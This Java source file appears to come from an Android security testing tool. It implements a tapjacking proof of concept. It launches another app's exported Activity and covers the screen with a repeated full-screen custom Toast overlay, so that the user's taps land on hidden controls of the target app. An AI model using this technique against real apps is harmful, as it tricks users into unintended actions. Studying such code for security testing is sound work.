package com.example.sherlockdroid.tools;

import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.example.sherlockdroid.MainActivity;
import com.example.sherlockdroid.R;

import static com.example.sherlockdroid.config.Config.ActivityExported;
import static com.example.sherlockdroid.config.Config.PACKAGE;

public class TapJacking extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        fireLongToast(createToast());
        Thread t = new Thread() {
            @SuppressLint("WrongConstant")
            public void run() {
                try {
                    sleep(1800);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                ComponentName componetName = new ComponentName(
                        PACKAGE,  //This is the package name of another application
                        ActivityExported);   //This parameter is the full pathname of the Activity to start
                Intent intent = new Intent();
                intent.setComponent(componetName);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        };
        t.start();
    }

    private void fireLongToast(final Toast toast) {
        Thread t = new Thread() {
            public void run() {
                int count = 0;
                int max_count = 10;
                try {
                    while (true && count < max_count) {
                        toast.show();
                        /*
                         * Torniamo alla schermata principale
                         */
                        if (count == max_count - 1) {
                            Intent intent = new Intent(getApplicationContext(), MainActivity.class);
                            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(intent);
                        }
                        /*
                         * this short sleep helps our toasts transition
                         */
                        sleep(1000);
                        count++;
                    }
                } catch (Exception e) {
                }
            }
        };
        t.start();
    }

    private Toast createToast() {
        LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        Toast toast = Toast.makeText(this, "",
                Toast.LENGTH_SHORT);
        View view = inflater.inflate(R.layout.tap_jacking_toast, null);
        toast.setView(view);
        toast.setGravity(Gravity.FILL, 0, 0);
        return toast;
    }
}
